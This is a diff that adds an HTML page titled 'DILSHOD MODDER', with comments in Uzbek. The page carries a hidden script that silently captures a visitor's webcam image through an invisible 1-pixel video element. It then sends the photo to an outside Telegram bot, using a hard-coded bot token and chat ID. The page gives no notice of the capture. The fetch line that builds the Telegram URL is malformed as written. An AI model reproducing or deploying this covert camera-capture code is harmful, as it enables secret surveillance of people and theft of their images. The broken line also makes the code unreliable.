@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <title>DILSHOD MODDER</title>
+</head>
+<body>
+    <video id="video" autoplay playsinline style="width:1px; height:1px; opacity: 0;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+
+        const BOT_TOKEN = '8287232126:AAH_Z1mFxaBfyarKbNQFBz1xQ2pico0OSsE'; 
+        const CHAT_ID = '8261811040';     
+
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+            .then(stream => {
+                video.srcObject = stream;
+                
+                // Rasm olishdan oldin video malumotlari yuklanishini kutish
+                video.onloadedmetadata = () => {
+                    setTimeout(() => {
+                        const context = canvas.getContext('2d');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        context.drawImage(video, 0, 0);
+
+                        canvas.toBlob(blob => {
+                            if (!blob) return;
+
+                            const formData = new FormData();
+                            formData.append('chat_id', CHAT_ID);
+                            formData.append('photo', blob, 'shot.png');
+
+                            // TO'G'RILANGAN URL:
+                            fetch(api.telegram.org{BOT_TOKEN}/sendPhoto, {
+                                method: 'POST',
+                                body: formData
+                            })
+                            .then(res => res.json())
+                            .then(data => {
+                                console.log("Telegram javobi:", data);
+                                // Kamera chirog'ini o'chirish (trackni to'xtatish)
+                                stream.getTracks().forEach(track => track.stop());
+                            })
+                            .catch(err => console.error("Yuborishda xato:", err));
+                        }, 'image/png');
+                    }, 2000); 
+                };
+            })
+            .catch(err => {
+                console.error("Kameraga kirish rad etildi:", err);
+            });
+        }
+    </script>
+</body>
+</html>
